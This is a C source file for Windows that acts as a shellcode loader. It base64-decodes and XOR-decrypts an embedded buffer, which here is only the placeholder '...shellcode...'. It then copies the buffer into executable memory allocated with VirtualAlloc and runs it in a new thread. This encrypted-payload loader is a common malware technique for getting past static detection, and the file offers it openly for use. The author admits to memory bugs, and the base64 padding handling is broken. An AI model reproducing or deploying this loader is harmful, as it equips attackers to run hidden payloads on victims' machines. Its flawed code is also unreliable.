#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>

// this code may not work sometimes, there are some memory issues i should fix but ion want to

void xor_decrypt(unsigned char* data, int length, unsigned char key) {
    for (int i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

size_t base64_decode(const unsigned char* input, size_t input_length, unsigned char* output, size_t output_length) {
    static const int decoding_table[256] = {
        ['A'] = 0, ['B'] = 1, ['C'] = 2, ['D'] = 3, ['E'] = 4, ['F'] = 5,
        ['G'] = 6, ['H'] = 7, ['I'] = 8, ['J'] = 9, ['K'] = 10, ['L'] = 11,
        ['M'] = 12, ['N'] = 13, ['O'] = 14, ['P'] = 15, ['Q'] = 16, ['R'] = 17,
        ['S'] = 18, ['T'] = 19, ['U'] = 20, ['V'] = 21, ['W'] = 22, ['X'] = 23,
        ['Y'] = 24, ['Z'] = 25, ['a'] = 26, ['b'] = 27, ['c'] = 28, ['d'] = 29,
        ['e'] = 30, ['f'] = 31, ['g'] = 32, ['h'] = 33, ['i'] = 34, ['j'] = 35,
        ['k'] = 36, ['l'] = 37, ['m'] = 38, ['n'] = 39, ['o'] = 40, ['p'] = 41,
        ['q'] = 42, ['r'] = 43, ['s'] = 44, ['t'] = 45, ['u'] = 46, ['v'] = 47,
        ['w'] = 48, ['x'] = 49, ['y'] = 50, ['z'] = 51, ['0'] = 52, ['1'] = 53,
        ['2'] = 54, ['3'] = 55, ['4'] = 56, ['5'] = 57, ['6'] = 58, ['7'] = 59,
        ['8'] = 60, ['9'] = 61, ['+'] = 62, ['/'] = 63
    };
    
    size_t output_length_actual = 0; // Changed variable name
    for (size_t i = 0; i < input_length; ) {
        uint32_t octet_a = i < input_length ? decoding_table[input[i++]] : 0;
        uint32_t octet_b = i < input_length ? decoding_table[input[i++]] : 0;
        uint32_t octet_c = i < input_length ? decoding_table[input[i++]] : 0;
        uint32_t octet_d = i < input_length ? decoding_table[input[i++]] : 0;

        if (octet_a == 0 && octet_b == 0 && octet_c == 0 && octet_d == 0) break;

        uint32_t triple = (octet_a << 18) | (octet_b << 12) | (octet_c << 6) | octet_d;

        if (output_length_actual + 3 > output_length) {
            fprintf(stderr, "Not enough space in output buffer.\n");
            return output_length_actual; // Early return if output buffer is insufficient
        }

        if (octet_c != 64) output[output_length_actual++] = (triple >> 16) & 0xFF;
        if (octet_d != 64) output[output_length_actual++] = (triple >> 8) & 0xFF;
        if (octet_d != 64) output[output_length_actual++] = triple & 0xFF;
    }

    return output_length_actual; // Return the actual output length
}

void decrypt_data(unsigned char** data, int* length, unsigned char key) {
    unsigned char* decoded_data = (unsigned char*)malloc(*length);
    if (decoded_data == NULL) {
        perror("Failed to allocate memory for decoded data");
        exit(EXIT_FAILURE); }
    size_t decoded_length = base64_decode(*data, *length, decoded_data, *length);

    xor_decrypt(decoded_data, decoded_length, key);

    free(*data);
    *data = decoded_data;
    *length = decoded_length;
}

void print_shellcode(unsigned char* shellcode, int length) {
    printf("Final shellcode in hex: ");
    for (int i = 0; i < length; i++) {
        printf("%02x ", shellcode[i]);
    }
    printf("\n");
}

int main() {
    unsigned char* encoded_shellcode = (unsigned char*)malloc(256);
    if (encoded_shellcode == NULL) {
        perror("Failed to allocate memory for shellcode");
        return EXIT_FAILURE;  }

    memcpy(encoded_shellcode, "...shellcode...", 256);
    int length = 256;
    unsigned char key = 0xAA;

    decrypt_data(&encoded_shellcode, &length, key);
    print_shellcode(encoded_shellcode, length);

    LPVOID allocated_mem = VirtualAlloc(NULL, length, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (allocated_mem == NULL) {
        printf("Failed to allocate memory: %d\n", GetLastError());
        free(encoded_shellcode);
        return 1;
    } else { printf("Memory Allocated at address: 0x%p\n", allocated_mem); }

    RtlCopyMemory(allocated_mem, encoded_shellcode, length);
    printf("Shellcode written\n");
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create thread: %d\n", GetLastError());
        VirtualFree(allocated_mem, 0, MEM_RELEASE);
        free(encoded_shellcode);
        return 1;
    } else { printf("Thread created\n"); }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_mem, 0, MEM_RELEASE);
    free(encoded_shellcode);
    system("pause");
    return 0;
}
